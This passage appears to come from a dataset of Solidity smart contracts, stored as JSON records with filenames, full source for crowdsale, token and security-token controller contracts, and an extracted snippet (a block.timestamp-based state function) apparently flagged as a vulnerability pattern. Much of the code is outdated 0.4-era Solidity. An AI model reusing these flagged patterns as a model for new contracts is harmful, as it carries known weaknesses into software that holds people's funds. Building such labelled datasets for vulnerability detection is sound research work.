uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa3"
  },
  "filename": "9891.sol",
  "content": "pragma solidity ^0.4.13;\ninterface IAffiliateList {\n function set(address addr, uint startTimestamp, uint endTimestamp) external;\n function get(address addr) external view returns (uint start, uint end);\n function inListAsOf(address addr, uint time) external view returns (bool);\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract IInvestorList {\n string public constant ROLE_REGD = \"regd\";\n string public constant ROLE_REGCF = \"regcf\";\n string public constant ROLE_REGS = \"regs\";\n string public constant ROLE_UNKNOWN = \"unknown\";\n function inList(address addr) public view returns (bool);\n function addAddress(address addr, string role) public;\n function getRole(address addr) public view returns (string);\n function hasRole(address addr, string role) public view returns (bool);\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n if (msg.sender == newOwner) {\n owner = newOwner;\n newOwner = 0;\n }\n }\n}\ncontract AffiliateList is Ownable, IAffiliateList {\n event AffiliateAdded(address addr, uint startTimestamp, uint endTimestamp);\n event AffiliateUpdated(address addr, uint startTimestamp, uint endTimestamp);\n mapping (address => uint) public affiliateStart;\n mapping (address => uint) public affiliateEnd;\n function set(address addr, uint startTimestamp, uint endTimestamp) public onlyOwner {\n require(addr != address(0));\n uint existingStart = affiliateStart[addr];\n if(existingStart == 0) {\n require(startTimestamp != 0);\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n affiliateEnd[addr] = endTimestamp;\n }\n emit AffiliateAdded(addr, startTimestamp, endTimestamp);\n }\n else {\n if(startTimestamp == 0) {\n if(endTimestamp == 0) {\n affiliateStart[addr] = 0;\n affiliateEnd[addr] = 0;\n }\n else {\n require(endTimestamp > existingStart);\n }\n }\n else {\n affiliateStart[addr] = startTimestamp;\n if(endTimestamp != 0) {\n require(endTimestamp > startTimestamp);\n }\n }\n affiliateEnd[addr] = endTimestamp;\n emit AffiliateUpdated(addr, startTimestamp, endTimestamp);\n }\n }\n function get(address addr) public view returns (uint start, uint end) {\n return (affiliateStart[addr], affiliateEnd[addr]);\n }\n function inListAsOf(address addr, uint time) public view returns (bool) {\n uint start;\n uint end;\n (start, end) = get(addr);\n if(start == 0) {\n return false;\n }\n if(time < start) {\n return false;\n }\n if(end != 0 && time >= end) {\n return false;\n }\n return true;\n }\n}\ncontract InvestorList is Ownable, IInvestorList {\n event AddressAdded(address addr, string role);\n event AddressRemoved(address addr, string role);\n mapping (address => string) internal investorList;\n modifier validRole(string role) {\n require(\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGD)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGCF)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_REGS)) ||\n keccak256(bytes(role)) == keccak256(bytes(ROLE_UNKNOWN))\n );\n _;\n }\n function inList(address addr)\n public\n view\n returns (bool)\n {\n if (bytes(investorList[addr]).length != 0) {\n return true;\n } else {\n return false;\n }\n }\n function getRole(address addr)\n public\n view\n returns (string)\n {\n require(inList(addr));\n return investorList[addr];\n }\n function hasRole(address addr, string role)\n public\n view\n returns (bool)\n {\n return keccak256(bytes(role)) == keccak256(bytes(investorList[addr]));\n }\n function addAddress(address addr, string role)\n onlyOwner\n validRole(role)\n public\n {\n investorList[addr] = role;\n emit AddressAdded(addr, role);\n }\n function addAddresses(address[] addrs, string role)\n onlyOwner\n validRole(role)\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n addAddress(addrs[i], role);\n }\n }\n function removeAddress(address addr)\n onlyOwner\n public\n {\n require(inList(addr));\n string memory role = investorList[addr];\n investorList[addr] = \"\";\n emit AddressRemoved(addr, role);\n }\n function removeAddresses(address[] addrs)\n onlyOwner\n public\n {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (inList(addrs[i])) {\n removeAddress(addrs[i]);\n }\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ISecurityController {\n function balanceOf(address _a) public view returns (uint);\n function totalSupply() public view returns (uint);\n function isTransferAuthorized(address _from, address _to) public view returns (bool);\n function setTransferAuthorized(address from, address to, uint expiry) public;\n function transfer(address _from, address _to, uint _value) public returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint);\n function approve(address _owner, address _spender, uint _value) public returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) public returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) public returns (bool success);\n function burn(address _owner, uint _amount) public;\n function ledgerTransfer(address from, address to, uint val) public;\n function setLedger(address _ledger) public;\n function setSale(address _sale) public;\n function setToken(address _token) public;\n function setAffiliateList(address _affiliateList) public;\n}\ncontract SecurityController is ISecurityController, Ownable {\n ISecurityLedger public ledger;\n ISecurityToken public token;\n ISecuritySale public sale;\n IInvestorList public investorList;\n ITransferAuthorizations public transferAuthorizations;\n IAffiliateList public affiliateList;\n uint public lockoutPeriod = 10 * 60 * 60;\n mapping(address => bool) public transferAuthPermission;\n constructor() public {\n }\n function setTransferAuthorized(address from, address to, uint expiry) public {\n require(transferAuthPermission[msg.sender]);\n require(from != 0);\n if(expiry > 0) {\n require(expiry > block.timestamp);\n require(expiry <= (block.timestamp + 30 days));\n }\n transferAuthorizations.set(from, to, expiry);\n }\n function setLockoutPeriod(uint _lockoutPeriod) public onlyOwner {\n lockoutPeriod = _lockoutPeriod;\n }\n function setToken(address _token) public onlyOwner {\n token = ISecurityToken(_token);\n }\n function setLedger(address _ledger) public onlyOwner {\n ledger = ISecurityLedger(_ledger);\n }\n function setSale(address _sale) public onlyOwner {\n sale = ISecuritySale(_sale);\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function setTransferAuthorizations(address _transferAuthorizations) public onlyOwner {\n transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);\n }\n function setAffiliateList(address _affiliateList) public onlyOwner {\n affiliateList = IAffiliateList(_affiliateList);\n }\n function setTransferAuthPermission(address agent, bool hasPermission) public onlyOwner {\n require(agent != address(0));\n transferAuthPermission[agent] = hasPermission;\n }\n modifier onlyToken() {\n require(msg.sender == address(token));\n _;\n }\n modifier onlyLedger() {\n require(msg.sender == address(ledger));\n _;\n }\n function totalSupply() public view returns (uint) {\n return ledger.totalSupply();\n }\n function balanceOf(address _a) public view returns (uint) {\n return ledger.balanceOf(_a);\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return ledger.allowance(_owner, _spender);\n }\n function isTransferAuthorized(address _from, address _to) public view returns (bool) {\n uint expiry = transferAuthorizations.get(_from, _to);\n uint globalExpiry = transferAuthorizations.get(_from, 0);\n if(globalExpiry > expiry) {\n expiry = globalExpiry;\n }\n return expiry > block.timestamp;\n }\n function checkTransfer(address _from, address _to, uint _value, uint lockoutTime)\n public\n returns (bool canTransfer, bool useLockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) {\n preservePurchaseDate = false;\n bool transferIsAuthorized = isTransferAuthorized(_from, _to);\n bool fromIsAffiliate = affiliateList.inListAsOf(_from, block.timestamp);\n bool toIsAffiliate = affiliateList.inListAsOf(_to, block.timestamp);\n if(transferIsAuthorized) {\n canTransfer = true;\n if(fromIsAffiliate || toIsAffiliate) {\n newTokensAreRestricted = true;\n }\n }\n else if(!fromIsAffiliate) {\n if(investorList.hasRole(_from, investorList.ROLE_REGS())\n && investorList.hasRole(_to, investorList.ROLE_REGS())) {\n canTransfer = true;\n }\n else {\n if(ledger.transferDryRun(_from, _to, _value, lockoutTime) == _value) {\n canTransfer = true;\n useLockoutTime = true;\n }\n }\n }\n }\n function ledgerTransfer(address from, address to, uint val) public onlyLedger {\n token.controllerTransfer(from, to, val);\n }\n function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\n uint lockoutTime = block.timestamp - lockoutPeriod;\n bool canTransfer;\n bool useLockoutTime;\n bool newTokensAreRestricted;\n bool preservePurchaseDate;\n (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n = checkTransfer(_from, _to, _value, lockoutTime);\n if(!canTransfer) {\n return false;\n }\n uint overrideLockoutTime = lockoutTime;\n if(!useLockoutTime) {\n overrideLockoutTime = 0;\n }\n return ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n }\n function approve(address _owner, address _spender, uint _value) public onlyToken returns 